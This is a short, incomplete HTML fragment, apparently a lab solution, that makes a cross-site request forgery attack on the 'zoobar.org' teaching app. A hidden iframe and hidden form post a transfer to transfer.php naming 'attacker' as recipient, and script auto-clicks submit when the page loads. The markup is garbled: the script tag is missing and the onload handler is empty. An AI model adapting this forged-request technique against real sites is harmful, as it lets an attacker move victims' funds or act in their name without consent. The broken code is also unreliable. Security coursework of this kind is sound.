  <body style="visibility: hidden">
    <iframe name="form_target" width="700" height="500" style="visibility: hidden" onLoad="iframe_onload()">

    <form name="attack_b" target="form_target" action="http://zoobar.org/transfer.php" method="post">

      <input type="hidden" name="recipient" value="attacker">
      <input type="submit" name="submission" value="Execute" id="submit">

      var redirect_flag = false;
      document.onload = execute();

        document.getElementById("submit").click();

      function iframe_onload()
      {
        if(redirect_flag)

      }

    </script>
